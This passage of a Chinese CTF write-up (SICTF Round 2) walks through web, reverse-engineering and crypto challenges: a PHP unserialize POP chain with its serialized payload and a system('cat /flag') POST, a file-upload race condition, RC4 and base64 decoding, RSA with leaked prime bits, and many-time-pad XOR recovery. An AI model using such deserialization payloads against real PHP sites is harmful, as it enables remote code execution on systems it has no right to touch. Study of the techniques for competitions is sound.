invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>思路：</p><ol><li>利用class B 的 <code>__clone</code>来rce。</li><li>class P 的 <code>__call</code>能实现1。</li><li>class B的 <code>game</code>能实现2。</li><li>class A的<code>__toString</code>能实现3。</li><li>class B 的 <code>__destruct</code>能实现4。</li><li>用数组绕过md5。</li><li>用<code>preg_match</code>触发<code>__tostring</code>。</li></ol></li><li><p>pop链：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span>=<span class="keyword">array</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop-&gt;Aec=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop-&gt;Aec-&gt;nogame=<span class="keyword">new</span> <span class="title function_ invoke__">p</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;N;&#125;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;i:1;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;i:2;&#125;&#125;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round2/w_5_1.png"></p></li><li><p>查看根目录的flag即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: ?A_B_C=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;Aec&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;P&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;MyLover&quot;</span>;N;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;girl&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;i:<span class="number">1</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;boy&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;i:<span class="number">2</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">post: cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h2><ol><li><p>题目要求要快，且每次上传文件后发现文件都被删除了，所以想到了文件上传的条件竞争。</p></li><li><p>用bp来弄条件竞争，先用bp的爆破无限制地上传文件，再另开一个爆破不断地访问，最后得到flag。</p><p><img src="/./SICTF_Round2/w_6_1.png"></p><p><img src="/./SICTF_Round2/w_6_2.png"></p></li></ol><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h2><ol><li><p>ida32打开文件，在<code>_main_0</code>函数看到一串类似base64的字符串。</p><p><img src="/./SICTF_Round2/r_1_1.png"></p></li><li><p>跟进<code>sub_4110F5</code>函数，直到<code>sub_411890</code>，发现这段函数实现了一个base64的编码。</p></li><li><p>找表。</p><p><img src="/./SICTF_Round2/r_1_2.png"></p></li><li><p>解码后得到flag。</p><p><img src="/./SICTF_Round2/r_1_3.png"></p></li></ol><h2 id="MyObject"><a href="#MyObject" class="headerlink" title="MyObject"></a>MyObject</h2><ol><li><p>查看main函数，发现一个名为rc4的函数，猜测是rc4加密，且看到key为<code>SIFLAG</code>。</p><p><img src="/./SICTF_Round2/r_2_1.png"></p></li><li><p>看到这几个变量有值，猜测这是加密后的密文。</p><p><img src="/./SICTF_Round2/r_2_2.png"></p></li><li><p>网上找一个解rc4的脚本改一下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RC4加密和解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="comment"># 初始化S盒</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># 交换S[i]和S[j]</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRGA</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># 交换S[i]和S[j]</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="comment"># 加密函数，返回加密后的字节流</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">        data_length = <span class="built_in">len</span>(data)</span><br><span class="line">        keystream = PRGA(KSA(key))</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data_length):</span><br><span class="line">            res.append(<span class="built_in">next</span>(keystream) ^ data[i])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line">    <span class="comment"># 解密函数，返回解密后的字节流</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">        <span class="keyword">return</span> encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> encrypt, decrypt</span><br><span class="line"><span class="comment"># 示例：</span></span><br><span class="line">key = <span class="string">b&#x27;SIFLAG&#x27;</span></span><br><span class="line">encrypt_func, decrypt_func = RC4(key)</span><br><span class="line">a=[<span class="string">b&#x27;G\xCF&quot;Z\x0E\xD3\&#x27;0&#x27;</span>,<span class="string">b&#x27;\xE5\vkG&#x27;</span>,<span class="string">b&#x27;\a\x85\xC3\x99\xBAS\x8D&#x27;</span>,<span class="string">b&#x27;\x9F\x88\xFE\x10w\x1C\x01\a&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decrypted Data:&#x27;</span>, decrypted_data)</span><br><span class="line">decrypted_data=decrypt_func(a[<span class="number">0</span>][::-<span class="number">1</span>]+a[<span class="number">1</span>][::-<span class="number">1</span>]+a[<span class="number">2</span>][::-<span class="number">1</span>]+a[<span class="number">3</span>][::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decrypted Data:&#x27;</span>, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Decrypted Data: b&#x27;SICTF&#123;wow_you_get_the_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>解码的过程中发现，从第三个字符串开始会乱码，去掉第三个字符串的<code>\xE5</code>，后边即可正常解码。</p></li></ol><h2 id="不一样的base64"><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h2><ol><li><p>使用 <a href="https://gitcode.net/mirrors/extremecoders-re/pyinstxtractor?utm_source=csdn_github_accelerator">pyinstxtractor</a>  反编译exe。</p></li><li><p>用 <a href="https://tool.lu/pyc">在线网站</a> 反编译<code>111.pyc</code>。</p><p><img src="/./SICTF_Round2/r_3_1.png"></p></li><li><p>base64解码即可得到flag。</p><p><img src="/./SICTF_Round2/r_3_2.png"></p></li></ol><h2 id="签到-PYC"><a href="#签到-PYC" class="headerlink" title="[签到]PYC"></a>[签到]PYC</h2><p>丢进在线pyc反编译即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到-古典大杂烩"><a href="#签到-古典大杂烩" class="headerlink" title="[签到]古典大杂烩"></a>[签到]古典大杂烩</h2><ol><li><p>打开文件，是一串emoji表情，base100解码。</p><p><img src="/./SICTF_Round2/c_1_1.png"></p></li><li><p>丢到赛博厨子里一个一个试，得到flag。</p><p><img src="/./SICTF_Round2/c_1_2.png"></p></li></ol><h2 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h2><p>RSA的p高位泄露。</p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p * q</span><br><span class="line">e = 65537</span><br><span class="line">leak = p &gt;&gt; 230</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(n)</span><br><span class="line">print(leak)</span><br><span class="line">print(c)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span><br><span class="line">6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span><br><span class="line">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><ol><li><p>先利用在线网站算出p。（在线网站：<a href="https://sagecell.sagemath.org/%EF%BC%89">https://sagecell.sagemath.org/）</a></p><p><img src="/./SICTF_Round2/c_2_1.png"></p></li><li><p>最后把p带入常规的rsa解码脚本，即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p=<span class="number">11790815224554410800121104187905468470390194289969616547114051282402254164513760262526048229096923579410713190006883604069013303904509383122210101811900773</span></span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><p>利用工具一把梭，即可得到flag。</p><p><img src="/./SICTF_Round2/c_3_1.png"></p><h2 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h2><p>参考链接：<a href="https://blog.csdn.net/m0_63303407/article/details/127193042">https://blog.csdn.net/m0_63303407/article/details/127193042</a></p><ol><li><p>直接利用现成的脚本。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="comment">#know(10, 21, &#x27;y&#x27;)</span></span><br><span class="line"><span class="comment">#know(8, 14, &#x27;n&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red,Rdin+ Hood ppomi4e</span></span><br><span class="line"><span class="string">d to obey de mo8her. Thg gr&amp;n</span></span><br><span class="line"><span class="string">dmother liz ou8 in the&quot;woo#s</span></span><br><span class="line"><span class="string">, a half hcu fr#m the vklla e</span></span><br><span class="line"><span class="string">. When Litxl     Re( Riding&quot;Hoo#</span></span><br><span class="line"><span class="string">entered thi ood? a wolf&quot;cam&quot;</span></span><br><span class="line"><span class="string">up to her.,Se d%d not klow 0h</span></span><br><span class="line"><span class="string">nim-l he waq, a)d</span></span><br><span class="line"><span class="string">id #f him.  Goo#</span></span><br><span class="line"><span class="string">day to you   itt e Red Rkdin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>可以勉强看出这是一个小红帽的故事，开始修复字符，先修复第一行的<code>Little Red Riding Hood</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red Riding Hood ppomi4e</span></span><br><span class="line"><span class="string">d to obey her mother. Thg gr&amp;n</span></span><br><span class="line"><span class="string">dmother lived out in the&quot;woo#s</span></span><br><span class="line"><span class="string">, a half hour from the vklla e</span></span><br><span class="line"><span class="string">. When Little Red Riding&quot;Hoo#</span></span><br><span class="line"><span class="string">entered the woods a wolf&quot;cam&quot;</span></span><br><span class="line"><span class="string">up to her. She did not klow 0h</span></span><br><span class="line"><span class="string">at a wicked animal he waq, a)d</span></span><br><span class="line"><span class="string"> was not afraid of him.  Goo#</span></span><br><span class="line"><span class="string">day to you, Little Red Rkdin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>接着修复第5行的<code>Little Red Riding Hood</code>，即可得到完整的文章。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span 